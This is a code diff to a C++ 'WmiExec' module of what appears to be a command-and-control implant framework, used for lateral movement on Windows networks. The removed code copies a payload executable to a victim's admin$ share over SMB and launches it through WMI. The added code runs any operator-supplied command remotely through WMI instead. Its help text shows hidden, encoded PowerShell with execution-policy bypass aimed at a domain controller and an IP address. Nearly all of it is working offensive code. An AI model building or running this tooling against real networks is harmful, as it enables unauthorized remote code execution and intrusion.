@@ -34,8 +34,6 @@ __declspec(dllexport) WmiExec* WmiExecConstructor()
     return new WmiExec();
 }
 
-BOOL createFileSMB(const std::string& dstPath, const std::string& data, std::string& result);
-
 #endif
 
 
@@ -54,11 +52,11 @@ std::string WmiExec::getInfo()
 {
 	std::string info;
 	info += "WmiExec:\n";
-	info += "Create an exe on an SMB share of the victime and execute it through WMI. \n";
+	info += "Execute a command through WMI. \n";
     info += "You must have the right kerberos tickets. \n";
 	info += "exemple:\n";
-	info += "- wmiExec m3dc.cyber.local /tmp/implant.exe\n";
-    info += "- wmiExec 10.9.20.10 /tmp/implant.exe\n";
+	info += "- wmiExec m3dc.cyber.local powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc ...\n";
+    info += "- wmiExec 10.9.20.10 powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc ...\n";
 
 	return info;
 }
@@ -69,24 +67,18 @@ int WmiExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
    if (splitedCmd.size() >= 3)
 	{
 		string server = splitedCmd[1];
-        string inputFile = splitedCmd[2];
+        
+        string cmd;
+        for (int idx = 2; idx < splitedCmd.size(); idx++) 
+        {
+            if(!cmd.empty())
+                cmd+=" ";
+            cmd+=splitedCmd[idx];
+        }
 
-		std::ifstream input(inputFile, std::ios::binary);
-		if( input ) 
-		{
-			std::string buffer(std::istreambuf_iterator<char>(input), {});
-
-			c2Message.set_instruction(splitedCmd[0]);
-			c2Message.set_inputfile(inputFile);
-			c2Message.set_cmd(server);
-			c2Message.set_data(buffer.data(), buffer.size());
-			}
-		else
-		{
-			c2Message.set_returnvalue("Failed: Couldn't open file.");
-			return -1;
-		}
-
+        c2Message.set_instruction(splitedCmd[0]);
+        c2Message.set_cmd(server);
+        c2Message.set_data(cmd.data(), cmd.size());
 	}
 	else
 	{
@@ -104,22 +96,6 @@ int WmiExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 }
 
 
-std::string randomName( size_t length )
-{
-    srand(time(NULL));
-    auto randchar = []() -> char
-    {
-        const char charset[] =
-        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-        "abcdefghijklmnopqrstuvwxyz";
-        const size_t max_index = (sizeof(charset) - 1);
-        return charset[ rand() % max_index ];
-    };
-    std::string str(length,0);
-    std::generate_n( str.begin(), length, randchar );
-    return str;
-}
-
 // https://learn.microsoft.com/en-us/windows/win32/wmisdk/example--calling-a-provider-method
 int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
 {
@@ -135,30 +111,6 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
 
 #ifdef _WIN32
 
-    // transfer payload to remote host
-    std::string execName = randomName(8);
-
-    std::string dstPath="\\\\";
-    dstPath+=server;
-    dstPath+="\\admin$\\";
-    dstPath+=execName;
-    dstPath+=".exe";
-
-    std::cout << server << std::endl;
-    std::cout << dstPath << std::endl;
-
-    BOOL ret=createFileSMB(dstPath, data, result);
-    if (!ret) 
-    {
-        result += "Upload Failed: ";
-        result += std::to_string(GetLastError());
-
-        c2RetMessage.set_instruction(m_name);
-        c2RetMessage.set_cmd(cmd);
-        c2RetMessage.set_returnvalue(result);
-        return 0;
-    }
-
     // Execute payload via WMI
     HRESULT hres;
 
@@ -167,7 +119,6 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
     {
         result += "CoInitializeEx Failed: ";
         result += std::to_string(GetLastError());
-        DeleteFile(dstPath.c_str());
 
         c2RetMessage.set_instruction(m_name);
         c2RetMessage.set_cmd(cmd);
@@ -192,7 +143,6 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
         result += "CoInitializeSecurity Failed: ";
         result += std::to_string(GetLastError());
         CoUninitialize();
-        DeleteFile(dstPath.c_str());
 
         c2RetMessage.set_instruction(m_name);
         c2RetMessage.set_cmd(cmd);
@@ -208,7 +158,6 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
         result += "CoCreateInstance Failed: ";
         result += std::to_string(GetLastError());
         CoUninitialize();
-        DeleteFile(dstPath.c_str());
 
         c2RetMessage.set_instruction(m_name);
         c2RetMessage.set_cmd(cmd);
@@ -229,7 +178,6 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
         result += std::to_string(GetLastError());
         pLoc->Release();     
         CoUninitialize();
-        DeleteFile(dstPath.c_str());
 
         c2RetMessage.set_instruction(m_name);
         c2RetMessage.set_cmd(cmd);
@@ -255,7 +203,6 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
         pSvc->Release();
         pLoc->Release();     
         CoUninitialize();
-        DeleteFile(dstPath.c_str());
 
         c2RetMessage.set_instruction(m_name);
         c2RetMessage.set_cmd(cmd);
@@ -275,15 +222,9 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
     IWbemClassObject* pClassInstance = NULL;
     hres = pInParamsDefinition->SpawnInstance(0, &pClassInstance);
 
-    std::string payloadPath="%SystemRoot%\\";
-    payloadPath+=execName;
-    payloadPath+=".exe";
-
-    // std::string payloadPath="powershell.exe -NoP -NoL -sta -NonI -Exec Bypass %SystemRoot%\\notepad.exe";
-
     VARIANT varCommand;
     varCommand.vt = VT_BSTR;
-    varCommand.bstrVal = _bstr_t(payloadPath.c_str());
+    varCommand.bstrVal = _bstr_t(data.c_str());
 
     hres = pClassInstance->Put(L"CommandLine", 0, &varCommand, 0);
 
@@ -305,7 +246,6 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
         pSvc->Release();
         pLoc->Release();
         CoUninitialize();    
-        DeleteFile(dstPath.c_str());
 
         c2RetMessage.set_instruction(m_name);
         c2RetMessage.set_cmd(cmd);
@@ -330,7 +270,6 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
     pLoc->Release();
     pSvc->Release();
     CoUninitialize();
-    DeleteFile(dstPath.c_str());
 
 #elif __linux__
 
@@ -346,28 +285,6 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
 
 
 #ifdef _WIN32 
-
-
-BOOL createFileSMB(const std::string& dstPath, const std::string& data, std::string& result)
-{
-    HANDLE hFile = CreateFile(dstPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) 
-    { 
-        result += "CreateFile fail: ";
-        result += std::to_string(GetLastError());
-        result += "\n";
-        return 0;
-    }
-
-    DWORD dwBytesWritten = 0;
-    BOOL bErrorFlag = WriteFile(hFile, data.data(), data.size(), &dwBytesWritten, NULL);
-    if (FALSE == bErrorFlag)
-        result += "Unable to write to file\n";
-
-    CloseHandle(hFile);
-
-    return bErrorFlag;
-}
 
 
 #endif
